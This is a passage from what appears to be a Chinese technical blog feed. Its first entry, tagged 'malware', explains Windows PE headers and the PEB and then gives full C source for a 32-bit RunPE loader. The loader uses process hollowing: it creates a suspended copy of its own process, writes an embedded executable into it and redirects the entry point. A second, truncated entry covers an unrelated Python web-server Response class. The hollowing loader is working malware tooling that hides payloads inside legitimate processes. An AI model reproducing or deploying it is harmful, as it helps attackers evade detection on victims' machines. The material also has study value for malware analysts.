class="line">    WORD   e_minalloc;                  <span class="comment">// 需要最少的额外段落</span></span><br><span class="line">    WORD   e_maxalloc;                  <span class="comment">// 需要最多的额外段落</span></span><br><span class="line">    WORD   e_ss;                        <span class="comment">// 初始（相对）SS 值</span></span><br><span class="line">    WORD   e_sp;                        <span class="comment">// 初始SP值</span></span><br><span class="line">    WORD   e_csum;                      <span class="comment">// Checksum</span></span><br><span class="line">    WORD   e_ip;                        <span class="comment">// 初始 IP 值</span></span><br><span class="line">    WORD   e_cs;                        <span class="comment">// 初始（相对）CS 值</span></span><br><span class="line">    WORD   e_lfarlc;                    <span class="comment">// 重定位表的文件地址</span></span><br><span class="line">    WORD   e_ovno;                      <span class="comment">// 叠加数</span></span><br><span class="line">    WORD   e_res[<span class="number">4</span>];                    <span class="comment">// 保留字</span></span><br><span class="line">    WORD   e_oemid;                     <span class="comment">// OEM 标识符（用于 e_oeminfo）</span></span><br><span class="line">    WORD   e_oeminfo;                   <span class="comment">// OEM信息； e_oemid 具体</span></span><br><span class="line">    WORD   e_res2[<span class="number">10</span>];                  <span class="comment">// 保留字</span></span><br><span class="line">    LONG   e_lfanew;                    <span class="comment">// 新exe头文件地址</span></span><br><span class="line">  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br></pre></td></tr></table></figure><p>其中DOS头有一个很重要的部分<code>e_lfanew</code>，他指向了exe的文件头，在我们编写的loader获取头的部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DOSHeader = PIMAGE_DOS_HEADER(Image);<span class="comment">//得到DOS头</span></span><br><span class="line">NTHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader-&gt;e_lfanew);<span class="comment">//得到PE头</span></span><br></pre></td></tr></table></figure><h2 id="nt头"><a class="markdownIt-Anchor" href="#nt头"></a> NT头</h2><p>那么关于NT文件头</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span> &#123;</span></span><br><span class="line">    DWORD Signature;<span class="comment">//文件类型</span></span><br><span class="line">                    <span class="comment">// IMAGE_DOS_SIGNATURE                 0x5A4D      // MZ</span></span><br><span class="line">                    <span class="comment">// IMAGE_OS2_SIGNATURE                 0x454E      // NE</span></span><br><span class="line">                    <span class="comment">// IMAGE_OS2_SIGNATURE_LE              0x454C      // LE</span></span><br><span class="line">                    <span class="comment">// IMAGE_VXD_SIGNATURE                 0x454C      // LE</span></span><br><span class="line">                    <span class="comment">// IMAGE_NT_SIGNATURE                  0x00004550  // PE00</span></span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;</span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 OptionalHeader;</span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure><p>这个文件头很关键，Signature可以判断类型，FileHeader即文件头，可以从<code>NumberOfSections</code>获得节区数目。</p><p>OPTIONAL_HEADER结构体如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> &#123;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Standard fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    WORD    Magic;</span><br><span class="line">    BYTE    MajorLinkerVersion;</span><br><span class="line">    BYTE    MinorLinkerVersion;</span><br><span class="line">    DWORD   SizeOfCode;</span><br><span class="line">    DWORD   SizeOfInitializedData;</span><br><span class="line">    DWORD   SizeOfUninitializedData;</span><br><span class="line">    DWORD   AddressOfEntryPoint;</span><br><span class="line">    DWORD   BaseOfCode;</span><br><span class="line">    DWORD   BaseOfData;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// NT additional fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    DWORD   ImageBase;</span><br><span class="line">    DWORD   SectionAlignment;</span><br><span class="line">    DWORD   FileAlignment;</span><br><span class="line">    WORD    MajorOperatingSystemVersion;</span><br><span class="line">    WORD    MinorOperatingSystemVersion;</span><br><span class="line">    WORD    MajorImageVersion;</span><br><span class="line">    WORD    MinorImageVersion;</span><br><span class="line">    WORD    MajorSubsystemVersion;</span><br><span class="line">    WORD    MinorSubsystemVersion;</span><br><span class="line">    DWORD   Win32VersionValue;</span><br><span class="line">    DWORD   SizeOfImage;</span><br><span class="line">    DWORD   SizeOfHeaders;</span><br><span class="line">    DWORD   CheckSum;</span><br><span class="line">    WORD    Subsystem;</span><br><span class="line">    WORD    DllCharacteristics;</span><br><span class="line">    DWORD   SizeOfStackReserve;</span><br><span class="line">    DWORD   SizeOfStackCommit;</span><br><span class="line">    DWORD   SizeOfHeapReserve;</span><br><span class="line">    DWORD   SizeOfHeapCommit;</span><br><span class="line">    DWORD   LoaderFlags;</span><br><span class="line">    DWORD   NumberOfRvaAndSizes;</span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure><p>OPTIONAL_HEADER中记载了很多详细信息，其中有用的就是<code>ImageBase</code>、<code>SizeOfHeaders</code>和<code>AddressOfEntryPoint</code></p><ul><li><code>ImageBase</code>：描写在虚拟内存中（不了解操作系统的话可以理解为程序启动的基地址）的地址</li><li><code>SizeOfHeaders</code>：记录了整个PE头的大小（包含DOS头），方便控制写入程序的大小</li><li><code>AddressOfEntryPoint</code>：<strong>记录程序入口代码起始地址</strong>，比如<code>ImageBase</code>可能为0x4000，<code>AddressOfEntryPoint</code>可能为0x4100。</li></ul><h2 id="iat导入表"><a class="markdownIt-Anchor" href="#iat导入表"></a> IAT导入表</h2><p>Windows为了知道使用了那些函数，会导入这些函数的表，从导入表到动态链接中查找函数。每一个节都会有一个导入表，每一个表的信息有40字节，那么找到表的地址就是<code>base + count*40</code>，其中<code>base</code>为<code>DOSHeader-&gt;e_lfanew+248</code>，这里是导入表的初始地址的指针。</p><h1 id="进程结构"><a class="markdownIt-Anchor" href="#进程结构"></a> 进程结构</h1><h2 id="pre-peb"><a class="markdownIt-Anchor" href="#pre-peb"></a> Pre- PEB</h2><p>这部分是铺垫的内容，主要描述的就是几个基础寄存器。</p><p>这些寄存器是CPU中设计好的，</p><ul><li>CS (Code Segment Register)：代码段的段基址</li><li>DS(Data Segment Register)：数据段的段基址</li><li>ES(Extra Segment Register)：其值为附加数据段的段基值，称为“附加”是因为此段寄存器用途不像其他 sreg 那样固定，可以额外做他用。</li><li>FS(Extra Segment Register)：其值为附加数据段的段基值</li><li>GS：同上</li><li>SS(Stack Segment Register)：堆栈段寄存器</li></ul><ol><li>在实模式中，CS、DS、ES、SS中的值是物理地址</li><li>在保护模式中，装入寄存器的是<strong>段选择子FS</strong></li></ol><p>其中最重要的就是 <strong>FS寄存器</strong>。在保护模式下，x86处理器使用段描述符来管理内存，将内存划分为不同的段，如代码段、数据段、堆栈段等。段选择子是一个16位的值，用于标识特定段的起始地址和访问权限。</p><p>FS寄存器主要有两个作用：</p><ol><li>定位线程局部存储（Thread Local Storage，TLS）：<ul><li>在多线程程序中，每个线程通常都有自己的TLS，用于存储线程本地的数据，如线程特定变量。</li><li>FS寄存器中存储了一个特殊的段选择子，用于定位线程的TLS。</li><li>线程可以通过访问FS寄存器来访问自己的TLS。</li></ul></li><li>访问段描述符表（Global Descriptor Table，GDT）：<ul><li>GDT是一个表格，用于存储段描述符的信息，包括段的起始地址、大小、访问权限等。</li><li>FS寄存器中存储了GDT中的一个段选择子，该段选择子指向了一个描述线程局部存储段的段描述符。</li><li>当线程需要访问TLS时，通过访问FS寄存器中的段选择子，可以获得TLS的起始地址和访问权限。</li></ul></li></ol><h2 id="peb"><a class="markdownIt-Anchor" href="#peb"></a> PEB</h2><p>PEB全称是 Process Environment Block，进程环境块</p><p>为了获取PEB的消息可以直接从FS段选择子找到TEB（线程环境块），再从TEB找到PEB，这里可以<code>CTX-&gt;Ebx + 8</code>找到PEB</p><h2 id="编程相关"><a class="markdownIt-Anchor" href="#编程相关"></a> 编程相关</h2><p>创建一个进程我们可以使用<code>CreateProcess</code>函数</p><blockquote><p>新进程在调用进程的安全上下文中运行。</p><p>如果调用进程正在模拟其他用户，则新进程将令牌用于调用进程，而不是模拟令牌。 若要在模拟令牌表示的用户的安全上下文中运行新进程，请使用 <a href="https://learn.microsoft.com/zh-cn/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createprocessasusera">CreateProcessAsUser</a> 或 <a href="https://learn.microsoft.com/zh-cn/windows/desktop/api/winbase/nf-winbase-createprocesswithlogonw">CreateProcessWithLogonW</a> 函数。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CreateProcessA</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in, optional]      LPCSTR                lpApplicationName,</span></span><br><span class="line"><span class="params">  [in, out, optional] LPSTR                 lpCommandLine,</span></span><br><span class="line"><span class="params">  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,</span></span><br><span class="line"><span class="params">  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span><br><span class="line"><span class="params">  [in]                BOOL                  bInheritHandles,</span></span><br><span class="line"><span class="params">  [in]                DWORD                 dwCreationFlags,</span></span><br><span class="line"><span class="params">  [in, optional]      LPVOID                lpEnvironment,</span></span><br><span class="line"><span class="params">  [in, optional]      LPCSTR                lpCurrentDirectory,</span></span><br><span class="line"><span class="params">  [in]                LPSTARTUPINFOA        lpStartupInfo,</span></span><br><span class="line"><span class="params">  [out]               LPPROCESS_INFORMATION lpProcessInformation</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><ul><li><p><code>lpApplicationName</code>：exe的文件路径，比如<code>c:\test.exe</code></p></li><li><p><code>lpCommandLine</code>：要执行该程序时的参数</p></li><li><p><code>bInheritHandles</code>：如果此参数为 TRUE，则调用进程中的每个可继承句柄都由新进程继承。 如果参数为 FALSE，则不继承句柄。</p></li><li><p><code>dwCreationFlags</code>：控制优先级类和进程的<strong>创建的标志</strong>。</p></li><li><p><code>lpProcessInformation</code>：进程信息</p><p>windows中使用<code>PROCESS_INFORMATION</code>描述</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PROCESS_INFORMATION</span> &#123;</span></span><br><span class="line">    HANDLE hProcess;<span class="comment">//新创建的进程的句柄。 句柄用于在对进程对象执行操作的所有函数中指定进程。</span></span><br><span class="line">    HANDLE hThread;<span class="comment">//新创建的进程的主线程的句柄。 句柄用于在线程对象上执行操作的所有函数中指定线程。</span></span><br><span class="line">    DWORD dwProcessId;<span class="comment">//可用于标识进程的值。 从创建进程到进程的所有句柄关闭并释放进程对象为止，该值有效;此时，可以重复使用标识符。</span></span><br><span class="line">    DWORD dwThreadId;<span class="comment">//可用于标识线程的值。 在线程创建到线程的所有句柄关闭且线程对象释放之前，该值有效;此时，可以重复使用标识符。</span></span><br><span class="line">&#125; PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;</span><br></pre></td></tr></table></figure></li><li><p><code>lpStartupInfo</code>：启动时的信息</p><p>同时如果要开启一个进程的话需要向其提供基础环境，windows中为<code>STARTUPINFOA</code>，指定创建时进程的主窗口的窗口工作站、桌面、标准句柄和外观。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">STARTUPINFOA</span> &#123;</span></span><br><span class="line">    DWORD   cb;<span class="comment">//结构大小（以字节为单位）。</span></span><br><span class="line">    LPSTR   lpReserved;<span class="comment">//保留;必须为 NULL</span></span><br><span class="line">    ...</span><br><span class="line">    DWORD   dwFlags;<span class="comment">//一个位字段，用于确定进程创建窗口时是否使用某些 STARTUPINFO 成员。 此成员可以是以下一个或多个值。</span></span><br><span class="line">    <span class="comment">//参考 https://learn.microsoft.com/zh-cn/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa</span></span><br><span class="line">   ...</span><br><span class="line">    WORD    cbReserved2;<span class="comment">//保留供 C 运行时使用;必须为零。</span></span><br><span class="line">    LPBYTE  lpReserved2;<span class="comment">//保留供 C 运行时使用;必须为 NULL。</span></span><br><span class="line">    HANDLE  hStdInput;</span><br><span class="line">    HANDLE  hStdOutput;</span><br><span class="line">    HANDLE  hStdError;</span><br><span class="line">&#125; STARTUPINFOA, *LPSTARTUPINFOA;</span><br></pre></td></tr></table></figure></li></ul><p>最后创建好的进程就在<code>lpProcessInformation</code>的<code>hProcess</code>中了</p><h1 id="编写loader进程镂空"><a class="markdownIt-Anchor" href="#编写loader进程镂空"></a> 编写Loader（进程镂空）</h1><p>知道了加载过程，那么</p><ol><li>获得DOS头，从而获得NT头</li><li>检查是否为正确的文件格式（PE）</li><li>初始化进程信息和启动时信息</li><li>创建当前程序进程的副本，并将副本设置为暂停</li><li>根据上下文信息找到导入表和PEB</li><li>复制导入表和PEB，将EAX设置为待加载PE文件的入口地址<code>DWORD(pImageBase) + NTHeader-&gt;OptionalHeader.AddressOfEntryPoint;</code></li><li>恢复暂停的副本，运行加载的PE文件</li></ol><p><img src="https://cdn-images.postach.io/1048057d-e83d-423e-a47b-f4c6f4737870/b9621a0e-f58d-43f9-8b52-331139f11008/8f876f09-767b-46d4-a370-627f87733e68.png" alt="img" /></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">RunPe</span><span class="params">(HANDLE Image)</span></span><br><span class="line">&#123;</span><br><span class="line">IMAGE_DOS_HEADER* DOSHeader;<span class="comment">//DOS文件头</span></span><br><span class="line">IMAGE_NT_HEADERS* NTHeader;<span class="comment">//PE文件头</span></span><br><span class="line">IMAGE_SECTION_HEADER* SectionHeader;<span class="comment">//节头</span></span><br><span class="line"></span><br><span class="line">PROCESS_INFORMATION PI;<span class="comment">//进程信息</span></span><br><span class="line">STARTUPINFOA SI;<span class="comment">//启动信息</span></span><br><span class="line"></span><br><span class="line">DWORD* ImageBase;<span class="comment">//VAR基地址</span></span><br><span class="line"><span class="type">void</span>* pImageBase;<span class="comment">//指向头的指针</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> count;</span><br><span class="line"><span class="type">char</span> FilePath[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line">DOSHeader = PIMAGE_DOS_HEADER(Image);<span class="comment">//得到DOS头</span></span><br><span class="line">NTHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader-&gt;e_lfanew);<span class="comment">//得到PE头</span></span><br><span class="line"></span><br><span class="line">GetModuleFileNameA(<span class="number">0</span>, FilePath, <span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (NTHeader-&gt;Signature == IMAGE_NT_SIGNATURE) &#123;<span class="comment">//检查是否为PE文件</span></span><br><span class="line">ZeroMemory(&amp;PI, <span class="keyword">sizeof</span>(PI));</span><br><span class="line">ZeroMemory(&amp;SI, <span class="keyword">sizeof</span>(SI));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CreateProcessA(FilePath, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE,</span><br><span class="line">CREATE_SUSPENDED, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;SI, &amp;PI)) &#123;<span class="comment">//创建当前进程的暂停副本</span></span><br><span class="line">CONTEXT *CTX = PCONTEXT(VirtualAlloc(<span class="literal">NULL</span>,<span class="keyword">sizeof</span>(CTX), MEM_COMMIT, PAGE_READWRITE));</span><br><span class="line">CTX-&gt;ContextFlags = CONTEXT_FULL;<span class="comment">//创建上下文</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) &#123;<span class="comment">//如果上下文在线程中</span></span><br><span class="line"><span class="comment">//读取指令</span></span><br><span class="line">ReadProcessMemory(PI.hProcess, LPCVOID(CTX-&gt;Ebx + <span class="number">8</span>), LPVOID(&amp;ImageBase), <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NTHeader-&gt;OptionalHeader.ImageBase),</span><br><span class="line">NTHeader-&gt;OptionalHeader.SizeOfImage, <span class="number">0x3000</span>, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 向进程的暂停副本写入指令</span></span><br><span class="line">WriteProcessMemory(PI.hProcess, pImageBase, Image, NTHeader-&gt;OptionalHeader.SizeOfHeaders, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (count = <span class="number">0</span>; count &lt; NTHeader-&gt;FileHeader.NumberOfSections; count++) &#123;</span><br><span class="line">SectionHeader = PIMAGE_SECTION_HEADER(DWORD(Image) + DOSHeader-&gt;e_lfanew+<span class="number">248</span>+(count*<span class="number">40</span>));</span><br><span class="line">WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader-&gt;VirtualAddress),</span><br><span class="line">LPVOID(DWORD(Image) + SectionHeader-&gt;PointerToRawData), SectionHeader-&gt;SizeOfRawData, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">WriteProcessMemory(PI.hProcess, LPVOID(CTX-&gt;Ebx + <span class="number">8</span>),</span><br><span class="line">LPVOID(&amp;NTHeader-&gt;OptionalHeader.ImageBase), <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//将入口地址放入EAX寄存器</span></span><br><span class="line">CTX-&gt;Eax = DWORD(pImageBase) + NTHeader-&gt;OptionalHeader.AddressOfEntryPoint;</span><br><span class="line">SetThreadContext(PI.hThread, LPCONTEXT(CTX));</span><br><span class="line">ResumeThread(PI.hThread);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> rawData[<span class="number">91209</span>] = &#123;...&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">RunPe(rawData);</span><br><span class="line"><span class="comment">//getchar();</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/d594572b354d7f3a546c13620b64d316.png" alt="result" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;使用windows API编写PE文件加载器（Loader）&lt;br /&gt;
目前支支持32位&lt;/p&gt;</summary>
    
    
    
    <category term="program" scheme="https://joe1sn.eu.org/categories/program/"/>
    
    
    <category term="malware" scheme="https://joe1sn.eu.org/tags/malware/"/>
    
    <category term="C" scheme="https://joe1sn.eu.org/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>【Muud开发】2.HTTP服务改善</title>
    <link href="https://joe1sn.eu.org/2023/06/01/web-0x2/"/>
    <id>https://joe1sn.eu.org/2023/06/01/web-0x2/</id>
    <published>2023-06-01T12:15:29.000Z</published>
    <updated>2023-06-06T07:15:20.342Z</updated>
    
    <content type="html"><![CDATA[<p>从0到1开发一个勉强能用的python web“框架”</p><p>项目地址：<a href="https://github.com/Joe1sn/muud">https://github.com/Joe1sn/muud</a></p><span id="more"></span><h1 id="主要改进"><a class="markdownIt-Anchor" href="#主要改进"></a> 主要改进</h1><h2 id="6-1-返回报文设置"><a class="markdownIt-Anchor" href="#6-1-返回报文设置"></a> 6-1 返回报文设置</h2><p>首先将原来的拼接字符串改为了Response类，实现HTTP报文字段的自定义</p><p>这样可以大大简化<code>view.py</code>中的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Response</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, <span class="built_in">type</span>=<span class="string">&quot;json&quot;</span>, status_code=<span class="number">200</span>, </span></span><br><span class="line"><span class="params">                        reply=<span class="string">&quot;&quot;</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.content_type = content_types[<span class="built_in">type</span>]</span><br><span class="line">        self.status_code = status_code</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span> == <span class="string">&quot;json&quot;</span>: </span><br><span class="line">            self.reply = json.dumps(reply, ensure_ascii=<span class="literal">False</span>).encode(<span class="string">&#x27;unicode_escape&#x27;</span>).decode()</span><br><span class="line">        <span class="keyword">else</span>:   self.reply = reply</span><br><span class="line">        self.length = <span class="built_in">len</span>(self.reply)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">consum</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        result = <span class="string">&quot;&quot;</span></span><br><span class="line">        result += <span class="string">&quot;HTTP/1.1 &#123;status_code&#125; &#123;msg&#125;\r\n&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            status_code=self.status_code,   msg=status_code_dict[self.status_code])</span><br><span class="line">        result += <span class="string">&quot;Content-Type: &#123;type&#125;\r\n&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            <span class="built_in">type</span> = self.content_type)</span><br><span class="line">        result += <span class="string">&quot;Content-Length: &#123;length&#125;\r\n&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            length=self.length)</span><br><span class="line">        result += <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">        result += self.reply</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>这样就可以更简单的编写视图函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@http_api</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">html_test</span>(<span class="params">http_request</span>):</span><br><span class="line">    data = <span class="string">&quot;&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hello, world!&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span></span><br><span class="line">    result = Response(reply=data,<span class="built_in">type</span>=<span class="string">&quot;html&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> result.consum().encode()</span><br></pre></td></tr></table></figure><p>不过任然欠缺文件服务，不过在<code>epoll</code>服务器的send部分修改就行了，更复杂的还涉及到文件上传等，后续实现http.server这种服务效果，不然静态网页加载很麻烦。</p><h2 id="6-2-设置更多的content_type"><a class="markdownIt-Anchor" href="#6-2-设置更多的content_type"></a> 6-2 设置更多的content_type</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">content_types = &#123;</span><br><span class="line">    <span class="string">&quot;text&quot;</span>: <span class="string">&quot;text/plain&quot;</span>,</span><br><span class="line">    <span class="string">&quot;html&quot;</span>: <span class="string">&quot;text/html&quot;</span>,    <span class="comment">#HTML文档</span></span><br><span class="line">    <span class="string">&quot;css&quot;</span> : <span class="string">&quot;text/css&quot;</span>,     <span class="comment">#CSS样式表</span></span><br><span class="line">    <span class="string">&quot;js&quot;</span> : <span class="string">&quot;text/javascript&quot;</span>,   <span class="comment">#JavaScript脚本</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;json&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pdf&quot;</span>: <span class="string">&quot;application/pdf&quot;</span>,</span><br><span class="line">    <span class="string">&quot;xml&quot;</span>: <span class="string">&quot;application/xml&quot;</span>,</span><br><span class="line">    <span class="string">&quot;bin&quot;</span>: <span class="string">&quot;application/octet-stream&quot;</span>,  <span class="comment">#[特质]</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;jpeg&quot;</span>: <span class="string">&quot;image/jpeg&quot;</span>,   <span class="comment">#JPEG图像</span></span><br><span class="line">    <span class="string">&quot;png&quot;</span>: <span class="string">&quot;image/png&quot;</span>,     <span class="comment">#PNG图像</span></span><br><span class="line">    <span class="string">&quot;gif&quot;</span>: <span class="string">&quot;image/gif&quot;</span>,     <span class="comment">#GIF图像</span></span><br><span class="line"></span><br><span 